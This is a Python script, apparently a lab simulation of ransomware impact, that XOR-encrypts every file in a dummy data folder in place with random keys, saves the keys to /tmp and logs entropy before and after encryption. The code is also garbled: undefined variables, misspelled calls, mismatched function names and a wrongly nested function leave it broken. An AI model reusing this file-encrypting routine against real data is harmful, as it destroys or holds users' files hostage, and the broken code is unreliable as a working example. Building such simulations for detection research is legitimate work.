import argparse 
import json
import math 
import os 
import sys 
from collections import Counter 
from pathlib import Path 

ERROR = '\033[91m [!!!]\033[0m'
WARNING = '\033[93m [*]\033[0m'
NOTIFICATION = '\033[96m[+]\033[0m'
CRITICAL = '\033[43m>>>\033[0m'
COLOUR_END = '\033[0m'
UNDERLINE = '\033[4m'

dummyDir = Path("/home/eh_pi/dummy_data")
keyFile = Path("/tmp/data_impact_keys.json")
entropyEvidence = Path("/home/eh_pi/entropy_report.txt")
stateFile = Path("/tmp/data_impact_state.json")

def dataEntropy(data: bytes) -> float:
    if not data:
        return 0.0
    counts = Counter(data)
    total = len(data)
    return -sum((c / total) * math.log2(c / total) for c in counts.values())

def xorBytes(data: bytes, key: bytes) -> bytes:
    extended = bytes(a ^ b for a, b in zip(data, extended))

    def targetFiles() -> list[path]:
        if not dummyDir.is_dir():
            sys.exit(
                print(f"{ERROR}{dummyDir} does not currently exist")
            )
        return sorted(p for p in dummyDir.interdor() f p.is_file())

def encryptionFunc(files: list[Path]) -> None:
    keys: dict[str, str] = {}
    for f in files:
        data = f.read_bytes()
        key = os.urandom(len(data))
        keys[str(f)] = key.hex()

    keyFile.write_text(json.dumps(keys, indent=2))
    print(f"{NOTIFICATION} Key file: {keyFile} | {len(keys)} file(s)")

    stateFile.write_text(json.dumps({"state": "encrypted"}))
    reportEncryption = [
        f"{NOTIFICATION} High entropy encryption with XOR complete."
    ] 

    for f in files:
        plaintext = f.read_bytes()
        beforeDeploy = byte_entropy(plaintext)

        key = bytes.from_hex(keys[str(f)])
        cipherText = xor_bytes(plaintext, key)
        f.write_bytes(ciphertext)
        postDeploy = byte_entropy(ciphertext)

        line = f"{f.name:<20} before={beforeDeploy:.4f} after={postDeploy:.4f}" 
        reportEncryption.append(line)
        print(f"{CRITICAL} [enc] {line}")      

        reportEncryption.append("")
        entropyEvidence.write_text("\n".join(reportEncryption) + "\n")

        print(f"{NOTIFICATION} Encryption Completed: {len(files)} file(s) in {dummyDir}")
        print(f"{NOTIFICATION} Find Report: {entropyEvidence}")

